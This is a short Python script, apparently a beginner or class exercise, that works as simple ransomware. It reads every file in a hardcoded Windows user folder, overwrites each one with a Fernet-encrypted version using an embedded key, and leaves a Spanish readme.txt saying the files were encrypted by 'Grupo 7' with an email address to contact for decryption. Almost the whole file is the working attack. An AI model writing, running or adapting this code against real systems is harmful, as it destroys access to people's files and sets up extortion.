import os
from cryptography.fernet import Fernet


# def generate_key():
#     key= Fernet.generate_key()
#     with open('key.key','wb') as key_file:
#         key_file.write(key)

def load_key():
    return "oj6rNDYCABQpMGVs3gKQCpnJGVKDHJGkjvt0k4dbwgw="

def encrypt_file(item, key):
    f= Fernet(key)
    for item in item:
        with open(item,'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':

    path_to_encrypt = 'C:\\Users\\wilma\\OneDrive\\Escritorio\\Privado'
    items = os.listdir(path_to_encrypt)
    full_path = [path_to_encrypt + '\\' + item for item in items]

    #generate_key()
    key = load_key()

    encrypt_file(full_path, key)

    with open(path_to_encrypt + '\\' + 'readme.txt', 'w') as file:
        file.write('Estos Archivos han sido encriptados por el Grupo 7 \n')
        file.write('Para poder desencriptar ponerse en contacto con hackerprincipiante@gmail.com\n')